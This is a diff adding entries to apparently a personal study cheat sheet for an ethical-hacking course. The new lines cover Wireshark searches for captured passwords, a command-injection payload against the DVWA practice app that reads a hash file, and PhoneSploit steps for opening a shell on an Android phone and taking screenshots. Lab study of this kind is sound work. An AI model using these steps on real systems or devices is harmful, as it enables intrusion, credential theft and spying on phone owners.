@@ -141,6 +141,12 @@ meterpreter > sysinfo && run vnc
 
 Module 08: Sniffing
 http.request.method == “POST” -> Wireshark filter for filtering HTTP POST request 
+Edit -> Find packet
+Display filter, select String. 
+Click Packet list, select Packet details from the drop-down options, 
+and click Narrow & Wide and select Narrow (UTF-8 1 ASCII) 7
+In the field next to String, type pwd and click the Find button
+
 Capture traffic from remote interface via wireshark
 Capture > Options > Manage Interfaces 
 Remote Interface > Add > Host &  Port (2002)
@@ -222,3 +228,27 @@ cewl example.com -m 5 -w words.txt
 # example.com is the site, 
 # -m is to specify the minimum length of the word, 
 # -w is to specify the output file
+
+dvwa
+ip&&type C:\wamp\hash.txt
+
+ADB using PhoneSploit
+apt-get install adb
+copied PhoneSploit 
+phyton3 -m pip install colorama
+type python3 phonesploit.py
+Connect a newphone. Opcion 3
+type IP android
+Access Shell on a phone. Opcion 4
+type IP android
+type pwd
+cd sdcard
+Screen Shot a
+picture on a phone. opcion 7
+
+Wireshark
+
+IoT protocol MQTT
+SYN flooding attack
+Statistics from the menu bar, and then click the I/O Graph
+Hijacking Attack ARP packets
